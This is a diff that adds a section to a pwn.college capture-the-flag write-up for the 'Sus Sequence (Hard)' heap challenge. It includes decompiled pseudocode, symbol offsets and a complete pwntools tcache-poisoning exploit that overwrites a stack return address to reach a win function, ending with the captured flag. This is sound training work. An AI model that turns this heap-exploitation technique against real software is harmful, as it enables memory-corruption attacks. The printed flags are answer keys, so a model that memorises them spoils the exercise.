@@ -5309,3 +5309,123 @@ Index:
 You win! Here is your flag:
 pwn.college{88twOvG52sbTbuMId3_XJu4ZfiL.0VO4MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Sus Sequence (Hard)
+
+```
+hacker@dynamic-allocator-misuse~sus-sequence-hard:/$ /challenge/sus-sequence-hard
+###
+### Welcome to /challenge/sus-sequence-hard!
+###
+
+[LEAK] The local stack address of your allocations is at: 0x7fff7069def0.
+
+[LEAK] The address of main is at: 0x558e484684fd.
+
+
+[*] Function (malloc/free/puts/scanf/quit):
+```
+
+The solution is the same as the [easy version](#sus-sequence-easy). The only differences are that there is no `print_tcache` display, and we have to find the offset between `main` and `win` from the binary ourselves.
+
+### Binary Analysis
+
+```c title="/challenge/sus-sequence-hard :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  unsigned int v5; // [rsp+20h] [rbp-120h]
+  unsigned int v6; // [rsp+20h] [rbp-120h]
+  unsigned int v7; // [rsp+20h] [rbp-120h]
+  unsigned int v8; // [rsp+20h] [rbp-120h]
+  unsigned int size; // [rsp+24h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+30h] [rbp-110h] BYREF
+  char s1[136]; // [rsp+B0h] [rbp-90h] BYREF
+  unsigned __int64 v12; // [rsp+138h] [rbp-8h]
+
+  v12 = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  // ...
+  printf("[LEAK] The local stack address of your allocations is at: %p.\n\n", ptr);
+  printf("[LEAK] The address of main is at: %p.\n\n", main);
+  // ...
+}
+```
+
+```
+hacker@dynamic-allocator-misuse~sus-sequence-hard:/$ nm /challenge/sus-sequence-hard | grep -E "main|win"
+                 U __libc_start_main@@GLIBC_2.2.5
+00000000000014fd T main
+0000000000001400 T win
+```
+
+The offset is the same as the easy version: `win_addr = leaked_main_addr - 0xfd`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/sus-sequence-hard", level='error')
+
+p.recvuntil(b"allocations is at: ")
+ptr_addr = int(p.recvuntil(b".").strip(b"."), 16)
+p.recvuntil(b"main is at: ")
+main_addr = int(p.recvuntil(b".").strip(b"."), 16)
+
+win_addr = main_addr - 0xfd
+ret_addr = ptr_addr + 0x118
+
+print(f"[*] ptr:  {hex(ptr_addr)}")
+print(f"[*] main: {hex(main_addr)}")
+print(f"[*] win:  {hex(win_addr)}")
+print(f"[*] ret:  {hex(ret_addr)}")
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+malloc(0, 128)
+malloc(1, 128)
+free(1)
+free(0)
+scanf(0, p64(ret_addr))
+malloc(0, 128)
+malloc(1, 128)
+scanf(1, p64(win_addr))
+
+p.sendline(b"quit")
+print(p.recvall().decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~sus-sequence-hard:/$ python ~/script.py 
+[*] ptr:  0x7fff7069def0
+[*] main: 0x558e484684fd
+[*] win:  0x558e48468400
+[*] ret:  0x7fff7069e008
+
+Index: 
+
+
+[*] Function (malloc/free/puts/scanf/quit): 
+### Goodbye!
+You win! Here is your flag:
+pwn.college{YED_XcBS6yXPfpwGLSYH_3ZZMX2.0FM5MDL4ITM0EzW}
+```
